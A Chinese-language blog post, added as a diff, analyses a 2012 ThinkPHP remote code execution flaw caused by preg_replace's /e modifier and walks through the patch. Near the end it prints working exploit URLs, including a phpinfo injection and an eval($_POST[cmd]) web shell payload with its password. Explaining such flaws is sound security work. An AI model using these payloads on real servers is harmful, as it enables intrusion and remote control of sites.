@@ -1,0 +1,51 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="小龙哥"><meta name="description" content="ThinkPHP是一款国内使用比较广泛的老牌PHPMVC框架，有不少创业公司或者项目都用了这个框架,ThinkPHP不正确过滤用户提交的参数，远程攻击者可以利用漏洞以应用程序上下文执行任意PHP代码。分析一下官方的补丁:/trunk/ThinkPHP/Lib/Core/Dis"><meta name="keywords" content="hack"><title>ThinkPHP URL漏洞可执行任意系统命令 · Simple</title><link rel="icon" href="/favicon.ico"><link rel="canonical" href="http://yoursite.com/2012/06/09/ThinkPHP的URL漏洞可执行任意系统命令/"><link rel="stylesheet" href="/fonts/iconfont/iconfont.css"><link rel="stylesheet" href="/css/style.css"><script type="text/javascript"><!-- hexo-inject:begin --><!-- hexo-inject:end -->var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e1cf5ee473c38c35cc639c1d42b75995";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><div id="main"><header><a href="/." class="logo">Simple</a><ul class="nav"><li class="nav-link"><a href="/" target="_self">Home</a></li><li class="nav-link"><a href="/archives/" target="_self">Archives</a></li><li class="nav-link"><a href="/categories/" target="_self">Categories</a></li><li class="nav-link"><a href="/tags/" target="_self">Tags</a></li><li class="nav-link"><a href="/about/" target="_self">About</a></li></ul></header><section id="container"><article class="post"><h1 class="post-title">ThinkPHP URL漏洞可执行任意系统命令</h1><span class="post-time">2012年6月9日</span><div class="post-content"><p>ThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架，有不少创业公司或者项目都用了这个框架,<br>ThinkPHP不正确过滤用户提交的参数，远程攻击者可以利用漏洞以应用程序上下文执行任意PHP代码。</p>
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><p>分析一下官方的补丁:<br>/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">125</span>  -   $res = preg_replace(<span class="string">'@(w+)'</span>.$depr.<span class="string">'([^'</span>.$depr.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'\\1\']="\\2";'</span>, implode($depr,$paths)); </div><div class="line"><span class="number">125</span>  +   $res = preg_replace(<span class="string">'@(w+)'</span>.$depr.<span class="string">'([^'</span>.$depr.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'\\1\']=\'\\2\';'</span>, implode($depr,$paths));</div></pre></td></tr></table></figure>
+<p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。<br>然而在用正则解析pathinfo的时候，主要是这一句：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?$res = preg_replace(<span class="string">'@(w+)'</span>.$depr.<span class="string">'([^'</span>.$depr.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'\\1\']="\\2";'</span>, implode($depr,$paths));</div></pre></td></tr></table></figure></p>
+<p>这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行，</p>
+<p>用这种方式在第二个参数中，利用PHP代码给数组动态赋值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'$var[\'\\1\']="\\2";'</span></div></pre></td></tr></table></figure></p>
+<p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。</p>
+<p>因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，</p>
+<p>使用如下方式进行访问，即可执行任意PHP代码：</p>
+<p><a href="http://site.com/index.php/module/action/param1/${@phpinfo()}" target="_blank" rel="external">http://site.com/index.php/module/action/param1/${@phpinfo()}</a><br>如：</p>
+<p><a href="http://localhost/ThinkPHP_3.0_Full/Examples/Form/index.php/module/action/param1/${@phpinfo()}直接拿SHELL类同。。。" target="_blank" rel="external">http://localhost/ThinkPHP_3.0_Full/Examples/Form/index.php/module/action/param1/${@phpinfo()}直接拿SHELL类同。。。</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php/module/action/param1/$&#123;@<span class="keyword">eval</span>%<span class="number">28</span>$_POST[cmd]%<span class="number">29</span>&#125;</div></pre></td></tr></table></figure>
+<p>密码：cmd</p>
+<p>不多说了。。。</p>
+</div></article><div class="tags"><a href="/tags/hack/">hack</a></div><div class="paginator"><a href="/2013/05/25/清水河畔知乎机器人/" class="prev"><i class="iconfont icon-left"></i><span> Prev</span></a><a href="/2012/04/13/最佳-Web-中文默认字体/" class="next"><span>Next</span><i class="iconfont icon-right"></i></a></div><section id="comments"><div id="disqus_thread"></div></section><script type="text/javascript">var disqus_config = function () {
+    this.page.url = 'http://yoursite.com/2012/06/09/ThinkPHP的URL漏洞可执行任意系统命令/';
+    this.page.identifier = '2012/06/09/ThinkPHP的URL漏洞可执行任意系统命令/';
+    this.page.title = 'ThinkPHP URL漏洞可执行任意系统命令';
+};
+(function() {
+var d = document, s = d.createElement('script');
+
+s.src = '//Your disqus ID.disqus.com/embed.js';
+
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();</script></section><footer><div class="copyright"><p>&copy;2016<span class="heart"><i class="iconfont icon-heart"></i></span><span class="author">小龙哥</span></p><p class="theme">Theme by <a href="https://github.com/ahonn/hexo-theme-even"> Even</a></p></div><label id="back2top"><i class="iconfont icon-up"></i></label></footer></div><script src="/js/zepto.min.js"></script><script src="/js/theme.js"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body></html>
